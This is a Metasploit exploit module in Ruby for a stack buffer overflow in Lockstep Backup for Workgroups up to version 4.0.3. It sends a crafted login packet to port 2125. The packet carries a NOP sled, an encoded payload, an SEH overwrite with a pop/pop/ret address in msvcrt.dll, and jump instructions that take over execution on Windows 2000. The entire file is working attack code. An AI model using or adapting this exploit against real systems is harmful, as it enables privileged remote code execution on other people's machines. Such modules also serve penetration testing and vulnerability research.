require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Lockstep Backup for Workgroups <= 4.0.3',
			'Description'    => %q{
				This module exploits a stack buffer overflow found in
				Lockstep Backup for Workgroups <= 4.0.3. The vulnerability
				is triggered when sending a specially crafted packet that
				will cause a login failure.
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://secunia.com/advisories/50260/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'	=> 1000,
					'BadChars' => "\x00",
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows 2000 ALL EN', 
							{ 
								# msvcrt.dll
								# pop ecx/ pop ecx/ retn
								'Ret' => 0x780146c0, 
							} 
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 11 2013'))

		register_options(
			[
				Opt::RPORT(2125),
				OptString.new('USERNAME', [ true, 'Username of victim', 'msf' ])
			], self.class )
	end

	def exploit
		connect

		uname = datastore['USERNAME']

		p =  "\x90" * 16
		p << payload.encoded

		packet = rand_text_alpha_upper(10000)
		packet[0, 8] = "BFWCA\x01\x01\x00"
		packet[8, uname.length] = "#{uname}\x00"
		packet[73, p.length] = p
		packet[7197, 4] = "\xeb\x06\x90\x90"		# jmp $+8
		packet[7201, 4] = [target.ret].pack('V')
		packet[7205, 8] = "\x90" * 8
		packet[7213, 2] = "\xff\xe7"			# jmp edi

		print_status("Trying target %s..." % target.name)

		sock.put(packet)

		handler
		disconnect
	end

end